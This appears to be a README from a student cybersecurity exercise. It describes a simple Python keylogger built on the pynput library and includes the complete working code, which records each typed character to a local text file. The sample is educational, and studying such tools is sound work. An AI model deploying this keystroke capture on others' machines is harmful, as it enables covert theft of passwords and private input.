# PRODIGY_CS_04
## Description 📋
The Simple Keylogger is a straightforward program designed to record keystrokes on a computer. This project demonstrates the basics of capturing and logging keyboard input using Python, leveraging the pynput library for seamless interaction with the keyboard.

## How It Works ❓
Keyboard Listener: The keylogger initializes a listener that continuously monitors keyboard events.
Keystroke Capture: When a key is pressed, the program captures the event and attempts to log the character.
Data Logging: The captured keystrokes are appended to a text file (keyfile.txt), providing a record of all input activity.

## Key Features 🔑
- **Real-time Monitoring:** The listener operates in real-time, ensuring all keystrokes are captured as they occur.
- **File Logging:** Each keystroke is stored in a file, enabling persistent logging and easy review.
- **Error Handling:** The program includes basic error handling to manage non-character key events gracefully.

## Code 📃
```
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
```
